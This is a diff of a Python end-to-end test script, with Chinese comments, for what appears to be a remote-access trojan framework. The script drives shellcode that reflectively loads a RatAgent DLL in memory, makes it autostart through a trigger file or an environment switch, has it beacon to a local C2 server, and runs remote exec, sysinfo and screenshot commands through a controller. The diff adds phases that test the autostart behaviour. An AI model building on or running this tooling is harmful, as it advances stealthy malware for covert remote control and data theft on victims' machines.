@@ -1,14 +1,19 @@
 # e2e_rdll.py — 反射加载(RfUdrl → runpic)验收
 # 验证链路:Kali 上 `cpl link loader.spec RatAgent.dll out.bin` 产出的 PIC,由
 #   runpic 宿主执行 → RfUdrl 在进程内反射加载内嵌的 RatAgent.dll(映射/重定位/
-#   导入/TLS/异常目录)→ NtContinue 进 DllMain → autostart 触发器自启动 →
-#   beacon 上线 → ratctl 交互(sessions/use/sysinfo/exec/screenshot)→
-#   跨进程命名事件优雅停止(用磁盘 DLL 的 Stop 导出触发)。
-# 前置(见 docs/PROGRESS.md「快速启动」):
-#   build/e2e/out.bin             ← Kali: scp DLL 上去后 cpl link(见 docs/PROGRESS.md §8.5)
+#   导入/TLS/异常目录)→ NtContinue 进 DllMain → autostart 自启动 → beacon 上线 →
+#   ratctl 交互(sessions/use/sysinfo/exec/screenshot)→ 跨进程命名事件优雅停止。
+#
+# 三个阶段:
+#   P1 触发器文件(显式参数)→ 完整远控 + 优雅停止
+#   P2 无触发器、无开关   → 必须**不**自启(开关默认关闭的负向验证)
+#   P3 无触发器 + RAT_AUTOSTART_DEFAULT=1 → 按内置默认配置自启(显式开关正向验证)
+#
+# 前置(见 docs/PROGRESS.md §8.5):
+#   build/e2e/out.bin                    ← Kali: scp DLL 上去后 cpl link
 #   build/bin/c2server.exe / ratctl.exe
-#   build/runpic/bin/runpic.exe    ← cmake -S tools/runpic -B build/runpic
-#   build/dll/bin/RatAgent.dll     ← MSBuild RatAgentDll.vcxproj(Stop 导出用)
+#   build/runpic/bin/runpic.exe          ← cmake -S tools/runpic -B build/runpic
+#   build/dll-release/bin/RatAgent.dll   ← MSBuild RatAgentDll.vcxproj -p:Configuration=Release
 import os
 import queue
 import subprocess
@@ -21,40 +26,33 @@ OUT_BIN = os.path.join(ROOT, "build", "e2e", "out.bin")
 RUNPIC = os.path.join(ROOT, "build", "runpic", "bin", "runpic.exe")
 C2 = os.path.join(ROOT, "build", "bin", "c2server.exe")
 RATCTL = os.path.join(ROOT, "build", "bin", "ratctl.exe")
-DLL = os.path.join(ROOT, "build", "dll", "bin", "RatAgent.dll")
+DLL = os.path.join(ROOT, "build", "dll-release", "bin", "RatAgent.dll")  # Release 形态
 WORK = os.path.join(ROOT, "build", "e2e")
 AGENT_ID = os.path.join(WORK, "agent.id")
 AGENT_LOG = os.path.join(WORK, "agent.log")
 RUNPIC_LOG = os.path.join(WORK, "runpic.log")
 C2_LOG = os.path.join(WORK, "c2server.log")
 SHOT = os.path.join(WORK, "shot.jpg")
-TRIGGER = None  # 运行时挑选(见 pick_trigger)
+
+# 把子进程的 LOCALAPPDATA 指进工作区:默认路径(autostart.args / agent.id / agent.log)
+# 落在可写且可查的位置,触发器路径随之确定(不必再去挑 %TEMP%)。
+HOME = os.path.join(WORK, "home")
+TRIGGER = os.path.join(HOME, "RatAgent", "autostart.args")
+DEFAULT_ID = os.path.join(HOME, "RatAgent", "agent.id")
+DEFAULT_LOG = os.path.join(HOME, "RatAgent", "agent.log")
+
+
+def fwd(p):
+    """Windows 路径 → 正斜杠(拼参数串用)。"""
+    return p.replace(os.sep, "/")
+
+
+CHILD_ENV = dict(os.environ)
+CHILD_ENV["LOCALAPPDATA"] = HOME
+# Stop 进程必须**不带**自启开关:否则它的 DllMain 也会自启,跨进程停止就测不到了
+STOP_ENV = {k: v for k, v in CHILD_ENV.items() if k != "RAT_AUTOSTART_DEFAULT"}
 
 ok = True
-
-
-def pick_trigger():
-    """挑选可写的 autostart 触发器路径。
-
-    agent 依次探测 %LOCALAPPDATA%\\RatAgent\\autostart.args → %TEMP%\\RatAgent\\
-    autostart.args(见 client/core/agent_runtime.cpp)。受限沙箱里 LOCALAPPDATA 往往
-    不可写,而 %TEMP% 被重定向到会话临时目录且子进程继承同一环境变量,故两者都试。
-    """
-    cands = []
-    for env in ("LOCALAPPDATA", "TEMP", "TMP"):
-        base = os.environ.get(env)
-        if base:
-            cands.append(os.path.join(base, "RatAgent", "autostart.args"))
-    for c in cands:
-        try:
-            os.makedirs(os.path.dirname(c), exist_ok=True)
-            with open(c, "a", encoding="utf-8"):
-                pass
-            os.remove(c)
-            return c
-        except OSError:
-            continue
-    return None
 
 
 def check(name, cond, detail=""):
@@ -85,7 +83,7 @@ class Shell:
                                      stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT,
                                      encoding="utf-8", errors="replace", bufsize=1,
-                                     cwd=ROOT)
+                                     cwd=ROOT, env=CHILD_ENV)
         self.q = queue.Queue()
         threading.Thread(target=self._reader, daemon=True).start()
 
@@ -166,8 +164,12 @@ def process_modules(pid):
         return None
 
 
+def registered_count():
+    """c2server 日志里 beacon 注册次数(用来按阶段区分 agent)。"""
+    return read_text(C2_LOG).count("registered (first GET)")
+
+
 def main():
-    global TRIGGER
     os.makedirs(WORK, exist_ok=True)
 
     # 0) 前置产物
@@ -177,31 +179,27 @@ def main():
         print("== RESULT: PREREQ MISSING")
         sys.exit(1)
 
-    # 0b) 触发器路径必须可写(LOCALAPPDATA 优先,TEMP 兜底)
-    TRIGGER = pick_trigger()
-    check("找到可写的 autostart 触发器位置", TRIGGER is not None,
-          TRIGGER if TRIGGER else "no writable candidate")
-    if TRIGGER is None:
-        print("== RESULT: NO TRIGGER PATH")
-        sys.exit(1)
-
-    # 1) 清理旧状态(id/log/截屏/触发器)
-    for f in (AGENT_ID, AGENT_LOG, RUNPIC_LOG, C2_LOG, SHOT, TRIGGER):
+    # 1) 清理旧状态(workspace 内 id/log/截屏 + 默认目录下的触发器/id/log)
+    for f in (AGENT_ID, AGENT_LOG, RUNPIC_LOG, C2_LOG, SHOT,
+              TRIGGER, DEFAULT_ID, DEFAULT_LOG):
         if os.path.exists(f):
             os.remove(f)
 
     srv = None
     runpic = None
     sh = None
+    p2 = None
+    p3 = None
     try:
         # 2) C2 服务器(日志落盘)
         with open(C2_LOG, "w", encoding="utf-8", errors="replace") as f:
-            srv = subprocess.Popen([C2], stdout=f, stderr=subprocess.STDOUT, cwd=ROOT)
+            srv = subprocess.Popen([C2], stdout=f, stderr=subprocess.STDOUT,
+                                   cwd=ROOT, env=CHILD_ENV)
         time.sleep(1)
 
-        # 3) autostart 触发器:DllMain 检测到即在自建线程启动(内容 = 参数串)
+        # ---- P1:触发器文件(显式参数) ----
+        # 3) 触发器内容 = 参数串;DllMain 检测到即在自建线程启动
         os.makedirs(os.path.dirname(TRIGGER), exist_ok=True)
-        fwd = lambda p: p.replace(os.sep, "/")
         args = f"127.0.0.1,8080,-s,2,id={fwd(AGENT_ID)},log={fwd(AGENT_LOG)}"
         with open(TRIGGER, "w", encoding="utf-8") as f:
             f.write(args)
@@ -209,7 +207,8 @@ def main():
         # 4) runpic 执行 PIC(--hold -1 无限驻留)
         with open(RUNPIC_LOG, "w", encoding="utf-8", errors="replace") as f:
             runpic = subprocess.Popen([RUNPIC, OUT_BIN, "--hold", "-1"],
-                                      stdout=f, stderr=subprocess.STDOUT, cwd=ROOT)
+                                      stdout=f, stderr=subprocess.STDOUT,
+                                      cwd=ROOT, env=CHILD_ENV)
 
         # 5) 等 agent.id(反射加载 + 入口点 + 自启动完成的硬标志)
         t0 = time.time()
@@ -289,7 +288,7 @@ def main():
         os.remove(TRIGGER)
         stop = subprocess.run(
             ["rundll32", f"{DLL},Stop", f"id={fwd(AGENT_ID)},log={fwd(AGENT_LOG)}"],
-            capture_output=True, timeout=30)
+            capture_output=True, timeout=30, env=STOP_ENV)
         check("Stop 调用返回", stop.returncode == 0)
         t0 = time.time()
         while time.time() - t0 < 15:
@@ -300,6 +299,50 @@ def main():
         # rundll32 宿主无控制台 → Stop 的输出走 log= 指定的文件
         check("signalled 命中事件", "-> signalled" in alog)
         check("agent 优雅停止", "[beacon] stopped" in alog, repr(alog[-200:]))
+
+        # ---- P2:无触发器 + 无开关 → 不应自启(开关默认关闭的负向验证) ----
+        runpic.kill()
+        runpic.wait(timeout=5)
+        before = registered_count()
+        p2_log = os.path.join(WORK, "runpic_p2.log")
+        with open(p2_log, "w", encoding="utf-8", errors="replace") as f:
+            p2 = subprocess.Popen([RUNPIC, OUT_BIN, "--hold", "-1"],
+                                  stdout=f, stderr=subprocess.STDOUT,
+                                  cwd=ROOT, env=CHILD_ENV)
+        time.sleep(12)
+        p2_txt = read_text(p2_log)
+        check("P2 loader 仍正常执行", "loader thread exited" in p2_txt, repr(p2_txt[-120:]))
+        check("P2 无触发器且未开开关:没有自启",
+              "[beacon] started" not in p2_txt and registered_count() == before,
+              f"registered={registered_count()} before={before}")
+        p2.kill()
+        p2.wait(timeout=5)
+        p2 = None
+
+        # ---- P3:无触发器 + RAT_AUTOSTART_DEFAULT=1 → 按默认配置自启 ----
+        env3 = dict(CHILD_ENV)
+        env3["RAT_AUTOSTART_DEFAULT"] = "1"
+        before3 = registered_count()
+        p3_log = os.path.join(WORK, "runpic_p3.log")
+        with open(p3_log, "w", encoding="utf-8", errors="replace") as f:
+            p3 = subprocess.Popen([RUNPIC, OUT_BIN, "--hold", "-1"],
+                                  stdout=f, stderr=subprocess.STDOUT,
+                                  cwd=ROOT, env=env3)
+        t0 = time.time()
+        while time.time() - t0 < 20 and not os.path.exists(DEFAULT_ID):
+            time.sleep(0.5)
+        p3_txt = read_text(p3_log)
+        check("P3 开关生效:默认 id 落盘", os.path.exists(DEFAULT_ID), fwd(DEFAULT_ID))
+        check("P3 开关生效:走了默认配置分支",
+              "autostart (no trigger, default config)" in p3_txt, repr(p3_txt[-160:]))
+        t0 = time.time()
+        while time.time() - t0 < 20 and registered_count() <= before3:
+            time.sleep(0.5)
+        check("P3 开关生效:默认 beacon 上线", registered_count() > before3,
+              f"registered={registered_count()} before={before3}")
+        p3.kill()
+        p3.wait(timeout=5)
+        p3 = None
     finally:
         # 8) 收尾:删触发器(关闭自启动)、杀宿主与服务器
         if sh:
@@ -309,9 +352,13 @@ def main():
                 os.remove(TRIGGER)
         except OSError:
             pass
-        if runpic:
-            runpic.kill()
-            runpic.wait(timeout=5)
+        for proc in (runpic, p2, p3):
+            if proc and proc.poll() is None:
+                proc.kill()
+                try:
+                    proc.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    pass
         if srv:
             srv.terminate()
             try:
